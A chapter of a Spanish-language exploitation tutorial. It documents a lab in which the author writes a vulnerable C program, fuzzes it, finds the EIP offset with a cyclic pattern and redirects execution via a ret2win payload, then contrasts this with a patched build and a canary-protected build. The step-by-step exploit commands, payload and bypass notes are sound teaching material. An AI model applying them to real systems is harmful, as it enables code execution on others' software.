# 4. Caso práctico: del fallo al exploit

Este capítulo recorre un caso **completo y reproducible** aplicando las 7 fases de mi
metodología a un **Stack Buffer Overflow**. Es el mismo camino que plantea el manual
(*"del fallo al exploit"*), pero documentado como lo haría un analista que quiere que otro
pueda repetirlo. Todo el código y los comandos están en [`../labs/`](../labs/).

> **Por qué este caso.** No es el fallo más crítico ni el más reciente, sino uno **sencillo de
> reproducir pero con trasfondo técnico real**: trivial en 32 bits, se complica en 64 bits y
> permite introducir después las protecciones modernas. Es el laboratorio perfecto para
> *construir conocimiento desde la raíz* en lugar de ejecutar pasos prefijados.

---

## 4.1. Entendiendo el proceso desde dentro

En vez de instalar una máquina vulnerable "ya hecha" y lanzar un exploit público, hago el
camino inverso: **escribo yo el programa vulnerable y su versión corregida**, para poder
contrastar directamente el comportamiento y recorrer de forma consciente cada fase intermedia
(análisis del crash, cálculo de offsets, control del flujo, inyección/redirección).

La familia elegida es clásica pero vigente: el **Stack Buffer Overflow**, que consiste en
desbordar un búfer situado en la pila hasta sobrescribir zonas adyacentes —entre ellas la
**dirección de retorno**— lo que permite, bajo ciertas condiciones, controlar el flujo de
ejecución.

---

## 4.2. Fase 1 — Identificación del fallo (código fuente)

El punto de entrada es evidente: el programa copia la entrada del usuario en un búfer fijo
**sin comprobar su tamaño**.

```c
// vulnerable.c  (fiel al manual)
void vulnerable_function(char *input) {
    char buffer[1000];
    strcpy(buffer, input);   // No hay verificación de tamaño -> Stack BOF
    printf("Has introducido: %s\n", buffer);
}
```

El *olor a fallo* es `strcpy(dest, src)` donde `src` lo controla el usuario y `dest` es un
búfer de pila de tamaño fijo. `strcpy` copia **hasta el `\0`**, sin mirar el tamaño de `dest`.

La versión corregida cambia una sola cosa —usar una función **con control de tamaño**— y con
eso desaparece la vulnerabilidad:

```c
// corregido.c  (fiel al manual)
if (strcpy_s(buffer, sizeof(buffer), input) != 0) {   // función segura
    printf("Error copiando los datos de entrada.\n");
    return;
}
```

> En Linux uso el equivalente `snprintf`/`strncpy` con tamaño explícito. La idea es idéntica:
> **nunca copies sin decir cuánto cabe en el destino.**

**Compilación del laboratorio** (32 bits, sin protecciones, para aislar el fallo):

```bash
# Windows / MinGW (manual)
gcc -m32 -fno-stack-protector -z execstack -o vulnerable.exe vulnerable.c

# Linux (versión del laboratorio, buffer de 64 para ver EIP con entradas cortas)
gcc -m32 -fno-stack-protector -no-pie -z execstack -o vuln_linux vuln_linux.c
```

---

## 4.3. Fase 1 (bis) — Diffing entre binarios vulnerable y corregido

Una vez generados ambos ejecutables, el **diffing** permite ver, a nivel de ensamblador, en
qué punto exacto se introduce la vulnerabilidad y cómo se corrige. Con **Ghidra** (análisis
estático) y **BinDiff/Diaphora** (comparación), la diferencia se reduce a esto:

| Binario | Qué se ve en el desensamblado |
|---------|-------------------------------|
| `vulnerable` | Llamada directa a `strcpy`; no hay comprobación de longitud antes de la copia |
| `corregido` | Llamada a `strcpy_s`/`snprintf` con el **tamaño** del búfer como argumento, y una rama que aborta si no cabe |

Esto es exactamente lo que, en la práctica profesional, se hace **sin código fuente**: el
diffing revela el fallo (y su parche) solo con los binarios. Ejercitarlo aquí, con el fuente
delante, entrena el ojo para cuando no lo tengas.

---

## 4.4. Fase 2–3 — Clasificación y contexto

- **Tipo de fallo:** Stack-Based Buffer Overflow → **CWE-121** (Stack-based Buffer Overflow),
  raíz **CWE-787** (Out-of-bounds Write) / **CWE-120** (copia sin comprobar tamaño).
- **Arquitectura:** x86-32 → el registro de instrucción es **EIP** (en x64 sería **RIP**).
- **Protecciones:** desactivadas a propósito (sin canary, sin PIE, NX off) para aislar la
  mecánica. En el capítulo 7 veremos qué pasa al reactivarlas.
- **Superficie:** entrada por línea de comandos (`argv[1]`). En un caso real sería un fichero,
  un paquete de red, un formulario, una API...
- **Punto de entrada:** confirmado que `vulnerable_function` recibe el argumento del usuario y
  lo pasa directo a `strcpy` sin control previo.

---

## 4.5. Fase 4 — Fuzzing: localizar el umbral del fallo

Envío cadenas cada vez más largas hasta que el binario deja de comportarse de forma normal y
**colapsa**:

```bash
python3 fuzzer.py ./build/vuln_linux --start 50 --step 50 --max 1000
```

```
[+] len=50    -> OK (rc=0)
[+] len=60    -> OK (rc=0)
[!] len=80    -> CRASH (rc=-11)      <-- SIGSEGV: la entrada corrompe la pila
...
[+] Primer CRASH observado alrededor de 80 bytes.
```

El umbral confirma la hipótesis: a partir de cierta longitud, la entrada sobrescribe algo que
hace al programa morir. Ese "algo" es, muy probablemente, la dirección de retorno.

---

## 4.6. Fase 4 — Análisis del crash y control de EIP

Ahora el objetivo es comprobar si puedo **controlar EIP**. Uso un **patrón cíclico** (cada
subsecuencia de 4 bytes es única), de modo que el valor que acabe en EIP me diga *exactamente*
en qué offset estoy:

```bash
PATRON=$(python3 find_offset.py gen 150)
gdb -q ./build/vuln_linux
(gdb) run $PATRON
...
Program received signal SIGSEGV
(gdb) info registers eip
eip   0x61616174          # <- valor real capturado del patrón en este laboratorio
```

Resuelvo el offset:

```bash
python3 find_offset.py find 0x61616174
# [+] Offset exacto: 76
```

Y verifico el **control total** enviando `A*offset + BBBB`:

```bash
(gdb) run $(python3 -c 'print("A"*76 + "BBBB")')
(gdb) info registers eip
eip   0x42424242          # "BBBB" -> CONTROLO EIP por completo
```

> **Nota de entorno (laboratorio real sobre Apple Silicon).** Este caso se ejecutó en una Kali
> **ARM64** compilando el binario x86-32 con el cross-compiler `i686-linux-gnu-gcc -static` y
> ejecutándolo bajo **QEMU** (`qemu-user`). El análisis sigue siendo 100 % x86/EIP; solo cambia
> que GDB se conecta al *gdbstub* de QEMU (`qemu-i386 -g 1234 …` + `gdb-multiarch`). Los valores
> de arriba (offset **76**, EIP capturado `0x61616174`) son los reales de esa ejecución. En un
> host x86 nativo el procedimiento es idéntico con `gcc -m32` y `gdb` directo. Detalle completo
> en [`../labs/README.md`](../labs/README.md).

> `eip = 0x42424242` es **la prueba de concepto fundamental**: si decido qué va en EIP, decido
> a dónde salta la CPU. A partir de aquí todo es elegir *a dónde* saltar.
>
> 📸 Esta es la captura clave (`capturas/04-control-eip.png`).

La estructura del payload queda fijada:

```
[ 'A' * 76 ][ dirección de retorno (4 bytes, little-endian) ][ ... ]
   relleno          nuevo EIP controlado por mí
```

---

## 4.7. Fase 5 — Explotación: redirigir el flujo (ret2win)

Con el offset confirmado y el control de EIP, construyo la carga. En un entorno de laboratorio
el "payload" puede ser algo simple —como abrir una calculadora o mostrar un mensaje— que sirva
para **validar que el control de ejecución es real**. Aquí uso **ret2win**: salto a una función
`win()` que existe en el binario pero que el flujo normal nunca invoca.

```bash
# 1) dirección real de win() (el binario la imprime al arrancar; o con nm)
nm -n build/vuln_linux | grep ' win'      # 08049895 T win  (en este laboratorio)

# 2) ajusta OFFSET y WIN_ADDR en exploit.py y lanza
python3 exploit.py ./build/vuln_linux
```

```
[+] win() alcanzada: control de flujo conseguido.
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

Payload final:

```python
payload = b"A"*76 + struct.pack("<I", 0x08049895)   # relleno + &win (little-endian)
```

> **Detalle de implementación que me costó un crash (y una lección).** La dirección de `win()`
> tiene bytes altos (`0x95`, `0x98`). Si el payload se pasa como *string* decodificado, Python
> lo recodifica a UTF-8 al construir `argv` y corrompe esos bytes (`0x95` → `0xC2 0x95`),
> haciendo que EIP reciba basura → SIGSEGV en vez de saltar a `win()`. La solución es pasar los
> **bytes crudos** por `argv` (lo que hace `exploit.py`). Es el tipo de detalle de bajo nivel
> que solo se aprende explotando de verdad.

### ¿Y en un escenario con protecciones?
Ret2win funciona porque no hay ASLR ni DEP estorbando y conozco la dirección. En un caso real
tendría que **adaptar la carga útil**:
- **DEP/NX activo** → nada de shellcode en pila: **ret2libc** (saltar a `system("/bin/sh")`) o
  **ROP** (encadenar gadgets).
- **ASLR activo** → necesito un **infoleak** para calcular direcciones en runtime.
- **Stack canary** → necesito **filtrar** el canary y reescribirlo intacto.

La elección de la técnica **depende del tipo de protección activa**. Eso enlaza directamente
con el capítulo 2 y es la esencia de la explotación moderna: no es un truco, es encadenar
soluciones a cada barrera.

### La evolución a 64 bits
El mismo fallo en x86-64 añade complejidad real y vale la pena mencionarla:
- El registro a controlar es **RIP**; las direcciones son de 8 bytes.
- La **convención de llamada** pasa argumentos por **registros** (`rdi`, `rsi`, `rdx`...), no por
  la pila → para llamar a `system("/bin/sh")` con ROP necesito un gadget `pop rdi; ret` que
  cargue el puntero a la cadena en `rdi`.
- Las direcciones suelen contener **bytes nulos** en la parte alta, que rompen `strcpy` (se
  corta en el `\0`) → hay que colocar cuidadosamente el payload.

---

## 4.8. Fase 6 — Validación y resumen del hallazgo

| Campo | Valor |
|-------|-------|
| **Vulnerabilidad** | Stack-Based Buffer Overflow (CWE-121) |
| **Causa raíz** | Copia sin control de tamaño (`strcpy`) de entrada controlada por el usuario |
| **Vector** | Argumento de entrada → `vulnerable_function` → `strcpy` |
| **Impacto** | Control de EIP → ejecución de código arbitrario (en el lab, shell vía `win()`) |
| **Condiciones** | 32 bits, sin canary / PIE / NX; o, con protecciones, leak + ROP |
| **Offset a EIP** | 76 (valor real de este laboratorio; depende del compilador) |
| **Dirección de `win()`** | 0x08049895 (binario `-no-pie`, dirección fija) |
| **Mitigación** | Funciones con control de tamaño + canary + PIE/ASLR + DEP/NX + FORTIFY |

---

## 4.9. Contraste final: el binario protegido

Compilando la **misma** vulnerabilidad con canary:

```bash
# (host x86)    make protegido
# (host ARM64)  make cross-protegido
qemu-i386 ./build/vuln_protegido $(python3 -c 'print("A"*200)')
# -> *** stack smashing detected ***: terminated
# -> qemu: uncaught target signal 6 (Aborted)
```

El **canary** detecta la sobrescritura y mata el proceso **antes** de usar la dirección de
retorno. El indicador técnico es nítido: el crash pasa de **señal 11 (SIGSEGV)** —corrupción de
la dirección de retorno— a **señal 6 (SIGABRT)** —abort del canary. La misma entrada que antes
daba una shell de root, ahora solo da un cierre controlado. Esa diferencia —entre un fallo
explotable y uno neutralizado por una decisión de compilación— es el puente natural hacia el
capítulo de bastionado.

> **Lo que demuestra este caso:** entender una vulnerabilidad de verdad significa recorrer
> *todas* las fases, no solo lanzar el exploit. Cada paso (fuzzing, offset, control de EIP,
> redirección) es una pieza transferible a vulnerabilidades mucho más complejas.

➡️ Continúa en [5. Casos reales (CVE) investigados](05-casos-reales-cve.md)
